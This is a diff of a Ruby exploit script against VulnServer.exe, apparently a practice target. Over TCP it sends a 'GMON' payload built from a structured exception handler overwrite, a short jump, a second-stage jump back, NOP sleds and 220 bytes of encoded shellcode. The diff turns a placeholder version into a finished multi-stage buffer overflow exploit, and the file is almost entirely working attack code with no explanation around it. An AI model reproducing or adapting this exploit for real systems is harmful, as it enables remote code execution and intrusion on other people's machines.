@@ -1,20 +1,19 @@
 #! /usr/bin/env ruby
 # VulnServer.exe Exploit
 # 
-# Usage ./vulnserv.rb <IP> <PORT> <PAYLOAD FILE>
+# Usage ./vulnserv.rb <IP> <PORT>
 #
 require 'socket'
 
 # Check arguments
-if ARGV.length < 3
-  puts "usage #{__FILE__} <target ip> <target port> <payload file>"
+if ARGV.length < 2
+  puts "usage #{__FILE__} <target ip> <target port>"
   exit
 end
 
 # Create the socket
 IP=ARGV[0]
 PORT=ARGV[1]
-FILE = ARGV[2]
 
 puts "[+] Connecting..."
 s = TCPSocket.new(IP, PORT)
@@ -24,11 +23,8 @@ cmd = "GMON"
 
 # Define payload
 payload = " /.:/"
-#payload += File.read(FILE)
-payload += "A" * 3519 # Padding
-payload += "CCCC" #"\xaf\x11\x50\x62" # Overwrite SEH with JMP ESP
-payload += "\x90" * 128 # NOP SLED
-payload += # shellcode 220bytes
+payload += "\x90" * 3167         # padding        
+payload +=                       # 3rd stage shellcode (220 bytes)
   "\xbd\xbc\xdd\xdf\xda\xd9\xc3\xd9\x74\x24\xf4\x5b\x33\xc9" +
   "\xb1\x31\x31\x6b\x13\x03\x6b\x13\x83\xeb\x40\x3f\x2a\x26" +
   "\x50\x42\xd5\xd7\xa0\x23\x5f\x32\x91\x63\x3b\x36\x81\x53" +
@@ -45,7 +41,11 @@ payload += # shellcode 220bytes
   "\x77\xe0\x89\xdc\xde\x70\x88\x80\xe0\xae\xce\xbc\x62\x5b" +
   "\xae\x3a\x7a\x2e\xab\x07\x3c\xc2\xc1\x18\xa9\xe4\x76\x18" +
   "\xf8\x86\x19\x8a\x60\x67\xbc\x2a\x02\x77"
-payload += "\x90" * (5000 - 3519 - 4 - 128 - 200)
+payload += "\x90" * 128          # NOP sled               
+payload += "\xeb\x0f\x90\x90"    # 1st Stage: JMP 0F NOP NOP
+payload += "\xb3\x11\x50\x62"    # SEH overwrite POP POP RET
+payload += "\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1\xe8\xf2\xff\xff\xff" # 2nd stage: JMP to start of payload
+payload += "\x90" * (5000 - payload.length)
 
 # Send the payload
 begin
